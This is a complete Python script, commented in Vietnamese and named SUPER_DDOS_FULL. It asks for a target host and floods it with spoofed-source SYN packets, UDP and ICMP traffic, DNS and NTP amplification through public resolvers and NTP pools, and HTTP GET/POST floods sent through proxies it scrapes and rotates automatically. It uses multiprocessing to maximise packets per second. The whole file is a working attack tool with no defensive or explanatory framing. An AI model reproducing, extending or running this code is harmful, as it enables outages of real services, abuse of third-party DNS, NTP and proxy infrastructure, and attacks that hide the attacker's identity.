#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   SUPER_DDOS_FULL.py – Code hoàn chỉnh, tích hợp tất cả tính năng
#   - Tấn công đa tầng: SYN (checksum đúng), UDP, ICMP, DNS/NTP amplification (spoofed)
#   - HTTP flood dùng aiohttp + proxy (tốc độ cao)
#   - Tự động quét proxy từ 10+ nguồn, xoay vòng, loại bỏ proxy chết
#   - Đa tiến trình (multiprocessing) vượt GIL, tối ưu libc
#   - Nhập IP hoặc domain, debug thời gian thực
#   - Chạy được trên Linux cần quyền root cho raw socket
#
#   Sử dụng: sudo python3 SUPER_DDOS_FULL.py
#

import os
import sys
import time
import random
import socket
import struct
import threading
import multiprocessing
import subprocess
import asyncio
import aiohttp
import requests
from pathlib import Path
from ctypes import CDLL, c_int, c_void_p
from ctypes.util import find_library
from concurrent.futures import ThreadPoolExecutor

# ---------------------- CẤU HÌNH MẶC ĐỊNH ---------------------------
CONFIG = {
    "target_host": "",
    "target_ip": "",
    "target_port": 80,
    "threads_per_process": 150,
    "num_processes": 0,
    "duration": 0,
    "use_proxy": True,
    "fallback_to_own_ip": True,
    "proxy_scan_interval": 60,
    "http_ratio": 0.4,
    "raw_modes": ["syn", "udp", "icmp", "dns", "ntp"],
    "max_proxy_fails": 3,
    "proxy_timeout": 3,
    "proxy_sources": [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://api.openproxylist.xyz/socks5.txt",
        "https://api.openproxylist.xyz/http.txt"
    ],
    "dns_servers": ["8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", "9.9.9.9", "208.67.222.222"],
    "ntp_servers": ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"]
}

packet_counter = multiprocessing.Value('Q', 0)
error_counter = multiprocessing.Value('Q', 0)

# ---------------------- HÀM CHECKSUM --------------------------------
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ---------------------- NHẬP LIỆU TƯƠNG TÁC -------------------------
def safe_input(prompt, default=None, required=False, cast_type=str):
    while True:
        try:
            val = input(prompt)
            if val.strip() == "" and default is not None:
                return default
            if required and val.strip() == "":
                print("[!] Vui lòng nhập giá trị.")
                continue
            if cast_type == int:
                return int(val)
            return val
        except ValueError:
            print("[!] Sai định dạng, nhập lại.")
        except KeyboardInterrupt:
            print("\n[!] Thoát.")
            sys.exit(0)

def resolve_host(host):
    try:
        return socket.gethostbyname(host)
    except:
        return host

def get_user_input():
    print("\n" + "="*60)
    print("   SUPER DDOS FULL – Hỗ trợ IP hoặc Domain")
    print("="*60)
    host = safe_input("Target (IP hoặc domain, vd: 1.2.3.4 hoặc example.com): ", required=True)
    ip = resolve_host(host)
    CONFIG["target_host"] = host
    CONFIG["target_ip"] = ip
    print(f"[*] Phân giải: {host} -> {ip}")
    CONFIG["target_port"] = safe_input("Port (mặc định 80): ", default=80, cast_type=int)
    CONFIG["threads_per_process"] = safe_input("Luồng mỗi tiến trình (mặc định 150): ", default=150, cast_type=int)
    cpu = os.cpu_count() or 4
    CONFIG["num_processes"] = safe_input(f"Số tiến trình (0 = auto = {cpu}): ", default=0, cast_type=int)
    if CONFIG["num_processes"] == 0:
        CONFIG["num_processes"] = cpu
    CONFIG["duration"] = safe_input("Thời gian (giây, 0 = vô hạn): ", default=0, cast_type=int)
    CONFIG["use_proxy"] = safe_input("Dùng proxy? (y/n, mặc định y): ", default='y').lower() != 'n'
    CONFIG["fallback_to_own_ip"] = safe_input("Fallback IP thật? (y/n, mặc định y): ", default='y').lower() != 'n'
    print("="*60)
    print("[*] Cấu hình đã nhận:")
    for k, v in CONFIG.items():
        if k not in ["proxy_sources", "dns_servers", "ntp_servers"]:
            print(f"    {k}: {v}")
    print("="*60)
    return CONFIG

# ---------------------- QUÉT PROXY ----------------------------------
def fetch_proxies_parallel():
    proxies = set()
    def get_from_url(url):
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                res = []
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        if '://' in line:
                            line = line.split('://')[1]
                        res.append(line)
                return res
        except:
            return []
        return []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(get_from_url, url) for url in CONFIG["proxy_sources"]]
        for f in futures:
            try:
                for p in f.result():
                    proxies.add(p)
            except:
                pass
    good = []
    for p in list(proxies)[:3000]:
        try:
            ip, port = p.split(':')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            start = time.time()
            sock.connect((ip, int(port)))
            sock.close()
            if time.time() - start < 0.2:
                good.append(p)
        except:
            pass
    with open("proxies.txt", 'w') as f:
        for p in good:
            f.write(p + "\n")
    return good

# ---------------------- CTYPES + SEND SPOOF -------------------------
_libc = None
try:
    _libc = CDLL(find_library("c"))
    _libc.sendto.argtypes = [c_int, c_void_p, c_int, c_int, c_void_p, c_int]
    _libc.sendto.restype = c_int
except:
    _libc = None

def send_raw(sock, packet, dest_ip, dest_port):
    try:
        if _libc:
            addr = struct.pack('=H4s', socket.AF_INET, socket.inet_aton(dest_ip))
            ret = _libc.sendto(sock.fileno(), packet, len(packet), 0, addr, len(addr))
        else:
            ret = sock.sendto(packet, (dest_ip, dest_port))
        if ret > 0:
            with packet_counter.get_lock():
                packet_counter.value += 1
        return ret
    except:
        with error_counter.get_lock():
            error_counter.value += 1
        return -1

# ---------------------- XÂY DỰNG GÓI SYN (CÓ CHECKSUM) ------------
def build_syn_packet(src_ip, dst_ip, sport, dport, seq):
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
        ip_frag_off, ip_ttl, ip_proto, 0, ip_src, ip_dst)
    tcp_src = sport
    tcp_dst = dport
    tcp_seq = seq
    tcp_ack = 0
    tcp_doff = 5
    tcp_flags = 0x02
    tcp_window = 65535
    tcp_urg = 0
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        (tcp_doff << 4), tcp_flags, tcp_window, 0, tcp_urg)
    psh = struct.pack('!4s4sBBH', ip_src, ip_dst, 0, ip_proto, 20) + tcp_header
    tcp_check = checksum(psh)
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        (tcp_doff << 4), tcp_flags, tcp_window, tcp_check, tcp_urg)
    return ip_header + tcp_header

# ---------------------- CÁC CHẾ ĐỘ TẤN CÔNG ------------------------
def syn_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 2**32-1)
        pkt = build_syn_packet(src, target_ip, sport, target_port, seq)
        send_raw(sock, pkt, target_ip, target_port)

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1400)
    while True:
        send_raw(sock, data, target_ip, target_port)

def icmp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
    while True:
        send_raw(sock, pkt, target_ip, 0)

def dns_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    domain = 'isc.org'
    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
    for part in domain.split('.'):
        q += bytes([len(part)]) + part.encode()
    q += b'\x00' + struct.pack('!HH', 1, 1)
    servers = CONFIG["dns_servers"]
    while True:
        dns_server = random.choice(servers)
        udp_len = 8 + len(q)
        udp = struct.pack('!HHHH', 53, 53, udp_len, 0)
        ip_tot_len = 20 + udp_len
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
            (4<<4)+5, 0, ip_tot_len, random.randint(0,65535),
            0, 255, 17, 0,
            socket.inet_aton(target_ip), socket.inet_aton(dns_server))
        packet = ip_hdr + udp + q
        send_raw(sock, packet, dns_server, 53)

def ntp_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
    servers = CONFIG["ntp_servers"]
    while True:
        ntp_server = random.choice(servers)
        udp_len = 8 + len(q)
        udp = struct.pack('!HHHH', 123, 123, udp_len, 0)
        ip_tot_len = 20 + udp_len
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
            (4<<4)+5, 0, ip_tot_len, random.randint(0,65535),
            0, 255, 17, 0,
            socket.inet_aton(target_ip), socket.inet_aton(ntp_server))
        packet = ip_hdr + udp + q
        send_raw(sock, packet, ntp_server, 123)

# ---------------------- HTTP FLOOD (aiohttp + proxy) ---------------
async def http_worker(proxy, target_ip, target_port):
    if '://' in proxy:
        proxy = proxy.split('://')[1]
    p_ip, p_port = proxy.split(':')
    p_port = int(p_port)
    proxy_url = f"socks5://{p_ip}:{p_port}"
    if 'http' in proxy.lower():
        proxy_url = f"http://{p_ip}:{p_port}"
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        url = f"http://{target_ip}:{target_port}/"
        headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
        while True:
            try:
                async with session.get(url, proxy=proxy_url, headers=headers, timeout=3) as resp:
                    await resp.read()
                async with session.post(url, proxy=proxy_url, headers=headers, data={'x':random.randint(1,9999)}, timeout=3) as resp:
                    await resp.read()
                with packet_counter.get_lock():
                    packet_counter.value += 2
            except:
                with error_counter.get_lock():
                    error_counter.value += 1

def run_http_loop(proxy, target_ip, target_port):
    asyncio.run(http_worker(proxy, target_ip, target_port))

# ---------------------- WORKER LUỒNG --------------------------------
def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_ref):
    fail_count = {}
    while True:
        proxy = None
        if CONFIG["use_proxy"] and proxy_list_ref and len(proxy_list_ref) > 0:
            proxy = random.choice(proxy_list_ref)
            if proxy and fail_count.get(proxy, 0) >= CONFIG["max_proxy_fails"]:
                try:
                    proxy_list_ref.remove(proxy)
                except:
                    pass
                proxy = None
        if proxy and mode == 'http':
            try:
                run_http_loop(proxy, target_ip, target_port)
            except:
                fail_count[proxy] = fail_count.get(proxy, 0) + 1
        else:
            if CONFIG["fallback_to_own_ip"] or not CONFIG["use_proxy"]:
                if mode == 'http':
                    try:
                        requests.get(f"http://{target_ip}:{target_port}/", timeout=1)
                        with packet_counter.get_lock():
                            packet_counter.value += 1
                    except:
                        with error_counter.get_lock():
                            error_counter.value += 1
                elif mode == 'syn':
                    syn_flood(target_ip, target_port)
                elif mode == 'udp':
                    udp_flood(target_ip, target_port)
                elif mode == 'icmp':
                    icmp_flood(target_ip)
                elif mode == 'dns':
                    dns_amp(target_ip)
                elif mode == 'ntp':
                    ntp_amp(target_ip)
            else:
                time.sleep(0.05)

def process_worker(target_ip, target_port, process_id, total_threads, proxy_manager_list):
    proxy_list = proxy_manager_list
    modes = ['http'] * int(total_threads * CONFIG["http_ratio"])
    raw_modes = CONFIG["raw_modes"]
    for _ in range(total_threads - len(modes)):
        modes.append(random.choice(raw_modes))
    random.shuffle(modes)
    threads = []
    for i, mode in enumerate(modes):
        t = threading.Thread(target=worker_loop, args=(process_id, i, target_ip, target_port, mode, proxy_list), daemon=True)
        t.start()
        threads.append(t)
    while True:
        time.sleep(10)

# ---------------------- DEBUG ---------------------------------------
def debug_loop(packet_counter, error_counter, proxy_list_ref):
    last_time = time.time()
    last_packets = 0
    while True:
        time.sleep(5)
        now = time.time()
        elapsed = now - last_time
        with packet_counter.get_lock():
            pkt = packet_counter.value
        with error_counter.get_lock():
            err = error_counter.value
        pps = (pkt - last_packets) / elapsed if elapsed > 0 else 0
        last_packets = pkt
        last_time = now
        proxy_count = len(proxy_list_ref) if proxy_list_ref else 0
        print(f"[DEBUG] {time.strftime('%H:%M:%S')} | Tổng gói: {pkt:,} | Lỗi: {err:,} | Tốc độ: {pps:,.0f} pps | Proxy: {proxy_count}")

# ---------------------- MAIN -----------------------------------------
def main():
    get_user_input()
    target_ip = CONFIG["target_ip"]
    target_port = CONFIG["target_port"]
    num_proc = CONFIG["num_processes"]
    threads_per_proc = CONFIG["threads_per_process"]
    total_threads = num_proc * threads_per_proc
    duration = CONFIG["duration"]

    print(f"\n[*] Khởi tạo với {num_proc} tiến trình, {total_threads} luồng.")
    print("[*] Đang quét proxy lần đầu...")

    manager = multiprocessing.Manager()
    proxy_list = manager.list()
    initial = fetch_proxies_parallel()
    for p in initial:
        proxy_list.append(p)
    print(f"[*] Đã có {len(proxy_list)} proxy chất lượng.")

    def proxy_updater(proxy_list):
        while True:
            time.sleep(CONFIG["proxy_scan_interval"])
            new = fetch_proxies_parallel()
            del proxy_list[:]
            for p in new:
                proxy_list.append(p)
            print(f"[*] Cập nhật proxy: {len(proxy_list)}")
    updater = multiprocessing.Process(target=proxy_updater, args=(proxy_list,), daemon=True)
    updater.start()

    processes = []
    for i in range(num_proc):
        p = multiprocessing.Process(target=process_worker, args=(
            target_ip, target_port, i, threads_per_proc, proxy_list
        ), daemon=True)
        p.start()
        processes.append(p)
    print(f"[*] Đã khởi động {num_proc} tiến trình.")

    debug_thread = threading.Thread(target=debug_loop, args=(packet_counter, error_counter, proxy_list), daemon=True)
    debug_thread.start()

    print("[*] Đang tấn công. Nhấn Ctrl+C để dừng.")
    try:
        if duration > 0:
            time.sleep(duration)
            print("[*] Hết thời gian. Thoát.")
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Người dùng dừng. Thoát.")
    finally:
        for p in processes:
            p.terminate()
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Khuyến nghị chạy với sudo để dùng raw socket.")
    main()
